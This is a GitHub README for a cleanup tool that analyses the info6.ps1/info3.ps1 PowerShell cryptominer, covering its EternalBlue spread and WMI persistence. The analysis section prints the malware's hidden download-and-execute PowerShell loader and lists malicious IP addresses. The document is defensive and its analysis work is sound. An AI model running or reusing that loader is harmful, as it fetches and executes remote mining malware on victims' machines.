# AntiMining-info6
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Logo.jpg)
#### By Carlos Ramírez López

## ABOUT
Currently, cryptocurrency mining malware with file name info6.ps1 is being propagated for architecture (X64) and info3.ps1 for architecture (x86) in Windows. This malware is divided into four parts:

  - Performance modification in the computer equipment to "high performance" through the Windows registry.
  - Mining of cryptocurrencies, increasing CPU processing between 70% and 100%. (Image 1)
  - Persistence in infected computers, modifications of Windows variable classes. (Image 2 and 3)
  - Propagation through the network taking advantage of the Eternalblue vulnerability in the SMB port 445 of shared folders, scanning the red segment of the computer equipment. (Image 4)

#### Image 1
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/CPU.jpg)

#### Image 2
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Clases.jpg)

#### Image 3
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Infected_Class.jpg)

#### Image 4
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Scan.jpg)

In the page www.virustotal.com, 16 of 59 antivirus detect the files info6.ps1 and info3.ps1 on February 12, 2018 as a malware, however, once the code has been executed on your computer, only 1 of 59 antivirus I detect it, but without creating a solution on the affected computers.
Malware info6.ps1 and info3.ps1
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Virus_Total1.jpg)

malware in the operating system
![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/Virus_total2.jpg)


### ANALYSIS
The malware is downloaded from different IP addresses by means of the script identifying the type of architecture:
#### DO NOT EXECUTE THE FALLOWING COMMAND

```
cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://IP /info6.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://IP/info3.ps1')}"
```
malicious IP addresses:
  - 195.22.127.157:8000/INFO6.PS1
  - 118.XXX.48.95:8000/INFO6.PS1
  - 93.XXX.93.73:8000/INFO6.PS1

#### The malware creates persistence stored in classes:
```
__FilterToConsumerBinding
CommandLineEventConsumer
__EventFilter –filter
```
## Elimination of malware

To eliminate the malware it is necessary to eliminate the variables the content of the affected variables where the malicious script is stored.
For this we only need to eliminate the powershell.exe from the task manager and execute the AntiMining-info6.bat script by double clicking on it, automatically removing the malware.

![alt tag](https://github.com/BillyV4/AntiMining-info6/blob/master/Screenshot/AntiMiner.jpg)


